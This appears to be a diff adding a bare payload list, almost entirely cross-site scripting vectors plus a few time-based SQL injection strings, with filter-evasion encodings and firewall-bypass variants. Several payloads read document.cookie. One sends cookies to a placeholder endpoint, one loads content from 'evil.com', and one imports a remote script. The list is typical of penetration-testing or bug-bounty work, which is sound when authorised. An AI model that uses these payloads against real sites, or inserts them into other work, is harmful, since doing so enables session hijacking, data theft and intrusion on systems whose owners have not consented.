@@ -1,0 +1,73 @@
+["');alert('XSS');//"]@xyz.xxx
+"/ng-click="constructor.constructor('alert(1)')()
+test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+rahul-dh@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+
++441134960000;phone-context=<script>alert(0)</script>
+
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+`';%20waitfor%20delay%20'0:0:6'%20--%20`
+*/prompt("XSS")/*&
+"-prompt`1`-"//
+\"-alert(1)}//
+'-(confirm)(1)-'
+%7D%7D;alert('XSS');%7B%7B
+<svg/onload=window["al"+"ert"]`1337`>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==")>
+<script ~~~>alert(0%0)</script ~~~>
+"><script>confirm(25)</script>
+<</div>script</div>>alert()<</div>/script</div>>
+--><script>alert("POCbyXalgord")</script>
+--><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<img src=1 onerror=alert(1)>
+"><img+src%3Dx+onerror%3Dalert(1)
+javascript:bing={};[2].find(confirm) 
+javascript:alert(document.cookie)
+javascript: prompt(document.cookie) ;
+<iframe+src=javascript:%26%2337%26%2354%26%2349lert(1)>
+<iframe %00 src="&Tab;javascript:prompt(document.cookie)&Tab;"%00>
+"><script>alert('XSS')</script>
+<img src="javascript:alert('XSS')">
+<img src onerror=alt=''+document.domain>
+<image/src/onerror=prompt(document.domain)>
+"><img src=x onmouseover=alert(1)><x
+"><Img/Src/Onerror=.1|Alert(Document.Cookie)>
+<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+"{\"<img src=x onerror=\\\"alert('XSS')\\\"/>\":1}"
+\u003e\u003cimg src=1 onerror=alert(0)\u003e
+">]<img src=x onerror=alert(document.domain)> ">]<img src=x onerror=alert(document.cookie)>
+<iframe src="javascript:alert('XSS')"></iframe>
+<svg onload="alert('XSS')">
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+%2522%253E%253CsVg%252FOnLuFy%253D%2522X%253Dy%2522oNloaD%253D%253B1%255Econfirm%25281%2529%253E
+%27%22%3E%3CScRipt+class%3DXalgord%3Ealert.bind%28%29%281%29%3C%2Fscript%3E
+"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>
+"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
+"><input autofocus nope="%26quot;x%26quot;"onfocus="frames.location='YOUR_ENDPOINT?c='+Reflect.get(document,'coo'+'kie')">
+<img//src/onerror=alert(1)>
+;</script><embed/test=''/allowscr%00iptaccess='always'/s%00rc='//evil.com'//>
+;</script><embed/test='asdf'/sr%00c='/'>
+;</script><img/test='asdf'/sr%00c=''/on%00error=prompt>
+;<sc%00ript/test='asdf'/te%00st2='asdf'>alert/**/(1)</script>
+;<sc%00ript/test='asdf'>alert/**/(1)</script>
+;<sc%00ript>alert/**/(1)</script>
+javascript:top[/al/.source+/ert/.source](document.cookie) 
+%26%2302java%26%23115cript:alert(document.domain)
+PFNjUmlQdCA+Y29uZmlybSgxKTwvU2NSaVB0Pg==
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
+<abdool attr=" --- x="=='='onmouseover=confirm`abdool`
+#"></div><a href=javaSCRIPT&colon;alert(document.cookie)>XSS</a>
+0xNaeem<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d(document.cookie)">click
+<details/open=/Open/href=/data=;+ontoggle="(alert)(document.domain)
+%3Cinput+onfocus%3d%27/*=*/Function(%22ale%22%2b%22rt(document.domain)%22)();//%27autofocus+
+%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D
+"><svg onload=prompt%26%23x000000028;document.domain)>
+"><textarea/onbeforeinput=kuro=&#x27;//domain.tld&#x27;;import(kuro)%09autofocus%09x>
+"%3e%3cImG%20sRC=X%20OneRRoR=alert(document.cookie)%20"%3c
+\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
+javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><akhil onbeforetoggle="+a+b+c+" popover id=x>sabhi</sabhi>")
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+</script><svg/onload=alert(0)>
+&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
+"><track/onerror='confirm`1`'>
